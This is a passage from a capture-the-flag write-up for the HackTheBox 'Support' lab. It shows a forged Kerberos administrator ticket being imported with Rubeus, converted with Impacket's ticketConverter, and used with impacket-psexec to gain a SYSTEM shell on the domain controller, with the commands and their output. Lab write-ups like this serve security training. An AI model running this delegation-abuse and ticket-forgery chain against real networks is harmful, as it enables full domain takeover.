      RhykGY62F4zLq1S6zU5cT9f9vdOfcEudQv8IYNClwmXMb3SG/lF2Yz2LqtnsM4TzPGr3GKhRnQ4s3mKZ
      7k1x8QcU1bVX2eWbsdfbJoMF4T4qprN6WlmVRcD3F+gKw7h0EA9Hkpoc+1mRT/5Z6DVEG63WN7hHO9Tr
      ADtFs0iKWbZ7S8sKm4d0cFpitaE+Q1InJW/wQ3M5KNeBJB3eb2ciInSBOPeDcU0Wa4A+pRdMG8CDtGo3
      MUDi/CuX/hIlc47RFCyW4xhrl3YlBli9tfkqO63AU7w/sE3F0Efqx4/OE6Ivs+HC8pEEKtc8BI+oGCi6
      gf1sZ0wKCWZU+6qNd5ymr/Hj95AbPKwOreMTekIXjc8R9+MP9zDWeA4WTwACUviBI7Si5haz36Jn6afX
      tUjQOqjr9XljjGoadk3t1TNpV+DXBZqt1pPaLhp7hFOtmx4ObYT0uxst9ZHYMtDzGYpGvxT3Kfi6oENl
      OwBjoDLY84VdWWuJKXuFdfl1UfIl4S2Gwol9Ae9gPAsKadZi9P0SRnq6Sm7EkW7Nz8E8FhgJbGb60xaM
      XBcQp+O0Go+Y4Yvmi4FYR9P17naS/WWjIHRhJpycsmLD5mbciW24oVBGNhaNAFbzx/CmA3pj0xXZyECj
      PGIDTOEu6OjFbMi/14fb0FerrFuvrgCQz24gonChZEnhVaGd+C/bD7lxLEuu/qEP+aa0ycFSg7oe2yZb
      JDkl5wRaM1uGFpzR0bxch32MZ5W2Nhb1ogjv4T+BU6oaXlQ634suwDv8RC2esqtqeohl197ipfZRjTXf
      We3IIywpqZjvlSBRqbaAIf68a1E7Kr6exiDrtdd99U6Fyvxe3DRQUUlrb9hA2uY2qz2E6bIzNYr7zfpb
      A1N894eXPW+ssWjEr+akr25yFO1urG7JjSmROdBbviZe+o/3JRzlGrlHbygNvHyJCa4pE74hKGa9rHOh
      RbIVIcJdVUO0HY5g+1jBu0RhcZWDKLOEobZ5/2bqiv0Km0cJ42N7ksAve9VdGBq8Z52xAlaVeI2Ip+yV
      vwnSofKp5+FBUIZzpkLe7nK3v6TdXmaVxWQCALHTZlniFCPbcFmYsoGQF8H1tPGf8Z1JClbTLeZCSOt7
      OV3hGCCBZtooDe9Lc+cdh8FU8UdZqNU7Smr0lmmnfXx+fabW74yQ8YdZGJVNN9X8kUbj+/mz1+Bv2Av7
      o4HZMIHWoAMCAQCigc4Egct9gcgwgcWggcIwgb8wgbygGzAZoAMCARGhEgQQqrO6AwKfvGpWgm/+p5JU
      76ENGwtTVVBQT1JULkhUQqIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAy
      NDA2MDkxNDAyNDhaphEYDzIwMjQwNjEwMDAwMjQ4WqcRGA8yMDI0MDYxNjE0MDI0OFqoDRsLU1VQUE9S
      VC5IVEKpITAfoAMCAQKhGDAWGwRjaWZzGw5kYy5zdXBwb3J0Lmh0Yg==
[+] Ticket successfully imported!
```

Rubeus shows the ticket in this session:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> klist

Current LogonId is 0:0x1266b5

Cached Tickets: (1)

#0>     Client: administrator @ SUPPORT.HTB
        Server: cifs/dc.support.htb @ SUPPORT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/9/2024 7:02:48 (local)
        End Time:   6/9/2024 17:02:48 (local)
        Renew Time: 6/16/2024 7:02:48 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

Attempting to enumerate admin directory results in error:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> dir ../../administrator
Access to the path 'C:\Users\administrator' is denied.
At line:1 char:1
+ dir ../../administrator
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\administrator:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

## Remote Approach

Grab the last ticket Rubeus generated, and copy it back to kali machine, saving it as `ticket.kirbi.b64`, making sure to remove all spaces. I’ll base64 decode it into ticket.kirbi:

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Convert it to a format that Impact can use:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
[sudo] password for kali: 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done
```

Use this to get a shell using psexec and get root flag

```bash
sudo KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file dpaufTVb.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service oOsL on dc.support.htb.....
[*] Starting service oOsL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator\Desktop

05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
06/09/2024  06:26 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,974,184,960 bytes free
```

# Resources

* [BloodHound 2.1's New Computer Takeover Attack - GenericAll](https://www.youtube.com/watch?v=RUbADHcBLKg&t=99s)
* [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)










